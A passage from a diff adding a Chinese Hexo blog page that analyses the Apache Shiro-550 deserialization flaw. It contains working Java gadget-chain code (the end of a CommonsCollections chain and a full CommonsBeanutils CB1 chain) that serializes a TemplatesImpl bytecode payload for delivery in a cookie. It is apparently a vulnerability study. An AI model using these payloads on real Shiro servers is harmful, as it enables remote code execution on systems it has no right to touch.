+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
+        HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();
+        map1.put(tiedMapEntry, &quot;b&quot;);
+        //反射调用&amp;删除 factory.transform的key值
+        Class lazyMapClass = LazyMap.class;
+        Field factory = lazyMapClass.getDeclaredField(&quot;factory&quot;);
+        factory.setAccessible(true);
+        factory.set(lazyMap, invokerTransformer);
+        lazyMap.remove(templates);
+        serialize(map1);
+    &#125;
+
+
+    public static void serialize(Object obj) throws Exception &#123;
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+        System.out.println(&quot;serialize&quot;);
+    &#125;
+
+&#125;
+</code></pre>
+<p>加密编码后放到cookie传输</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141272939.png" alt="image-1709141272939"></p>
+<p>利用链</p>
+<p>HashMap.readObject--&gt;TiedMapEntry.hashCode--&gt;LazyMap#get--&gt;InvokerTransformer#transform--&gt;TemplatesImpl.newTransformer()--&gt;defineClass-&gt;newInstance</p>
+<h1 id="CB链分析"><a href="#CB链分析" class="headerlink" title="CB链分析"></a>CB链分析</h1><p>在shiro中大多数情况下并没有引用CC依赖，从而无法使用CC链去进行利用。但是默认使用了Commons<br>Beanutils，可以使用CB链进行利用。</p>
+<p>org.apache.commons.beanutils.PropertyUtils#getProperty方法可以调用任意<br>JavaBean 的 getter 方法。</p>
+<p>示例：</p>
+<pre><code>package org.example;
+
+
+
+import org.apache.commons.beanutils.PropertyUtils;
+
+import java.lang.reflect.InvocationTargetException;
+
+
+
+public class Bean &#123;
+
+    private String name = &quot;Test&quot;;
+
+    public String getName()&#123;
+
+        return name;
+
+ &#125;
+
+    public void setName (String name) &#123;
+
+        this.name = name;
+
+ &#125;
+
+
+
+    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;
+
+        System.out.println(PropertyUtils.getProperty(new Bean(),&quot;name&quot;));
+
+    &#125;
+
+&#125;
+</code></pre>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141284225.png" alt="image-1709141284225"></p>
+<p>getOutputProperties方法调用了newTransformer(),它可以动态加载类进行代码执行，并且getOutputProperties方法符合JavaBean<br>的命名格式。</p>
+<p>代码调试：</p>
+<pre><code>package org.example;
+
+
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import org.apache.commons.beanutils.PropertyUtils;
+
+
+
+import java.lang.reflect.Field;
+
+import java.nio.file.Files;
+
+import java.nio.file.Paths;
+
+
+
+public class CB1 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        TemplatesImpl templates = new TemplatesImpl();
+
+        Class c = templates.getClass();
+
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+
+        nameField.setAccessible(true);
+
+        nameField.set(templates,&quot;a&quot;);
+
+
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+
+        bytecodesField.setAccessible(true);
+
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+
+        byte[][] bytecodes = &#123;bytecode&#125;;
+
+        bytecodesField.set(templates,bytecodes);
+
+
+
+        Field tfactoryField = c.getDeclaredField(&quot;_tfactory&quot;);
+
+        tfactoryField.setAccessible(true);
+
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+
+
+
+
+        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+
+
+
+
+
+    &#125;
+
+&#125;
+</code></pre>
+<p>成功执行了命令，下一步看哪里调用了getProperty，构造一条利用链出来</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141291695.png" alt="image-1709141291695"></p>
+<p>跟进到org.apache.commons.beanutils.PropertyUtils#getProperty看哪里调用了它，发现BeanComparator#compare调用了getter</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141296938.png" alt="image-1709141296938"></p>
+<p>并且<em>getProperty</em>的参数可控</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141302146.png" alt="image-1709141302146"></p>
+<p>compare方法在CC2和CC4都进行调用了，之前用的是TransformingComparator.compare，如果把TransformingComparator替换为BeanComparator,这条链就连起来了。</p>
+<p>完整代码：</p>
+<pre><code>package org.example;
+
+
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+
+import org.apache.commons.beanutils.BeanComparator;
+
+import org.apache.commons.collections4.comparators.TransformingComparator;
+
+import org.apache.commons.collections4.functors.ConstantTransformer;
+
+
+
+import java.io.*;
+
+import java.lang.reflect.Field;
+
+import java.nio.file.Files;
+
+import java.nio.file.Paths;
+
+import java.util.PriorityQueue;
+
+
+
+public class CB1 &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        //CC3
+
+        TemplatesImpl templates = new TemplatesImpl();
+
+        Class c = templates.getClass();
+
+        Field nameField = c.getDeclaredField(&quot;_name&quot;);
+
+        nameField.setAccessible(true);
+
+        nameField.set(templates,&quot;a&quot;);
+
+
+
+        Field bytecodesField = c.getDeclaredField(&quot;_bytecodes&quot;);
+
+        bytecodesField.setAccessible(true);
+
+        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;D://tmp//class//Test.class&quot;));
+
+        byte[][] bytecodes = &#123;bytecode&#125;;
+
+        bytecodesField.set(templates,bytecodes);
+
+
+
+        //CB
+
+        BeanComparator comparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare());
+
+
+
+        //CC2
+
+        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));
+
+        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
+
+        priorityQueue.add(templates);
+
+        priorityQueue.add(2);
+
+
+
+        Field comparator1 = PriorityQueue.class.getDeclaredField(&quot;comparator&quot;);
+
+        comparator1.setAccessible(true);
+
+        comparator1.set(priorityQueue,comparator);
+
+
+
+        serialize(priorityQueue);
+
+        unserialize(&quot;ser.bin&quot;);
+
+
+
+    &#125;
+
+
+
+    public static void serialize(Object obj) throws Exception&#123;
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+
+        objectOutputStream.writeObject(obj);
+
+        System.out.println(&quot;serialize&quot;);
+
+    &#125;
+
+
+
+    public static Object unserialize(String str) throws IOException, ClassNotFoundException &#123;
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(str));
+
+        Object obj = objectInputStream.readObject();
+
+        System.out.println(&quot;unserialize&quot;);
+
+        return obj;
+
+    &#125;
+
+&#125;
+</code></pre>
+<p>编码后通过cookie发送</p>
+<p><img src="/../imgs/Shiro%E6%A1%86%E6%9E%B6550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-1709141315070.png" alt="image-1709141315070"></p>
+<p>利用链</p>
+<p>PriorityQueue#readObject--&gt;BeanComparator#compare--&gt;PropertyUtils.getProperty--&gt;TemplatesImpl#getOutputProperties--&gt;TemplatesImpl.newTransformer()--&gt;defineClass-&gt;newInstance</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
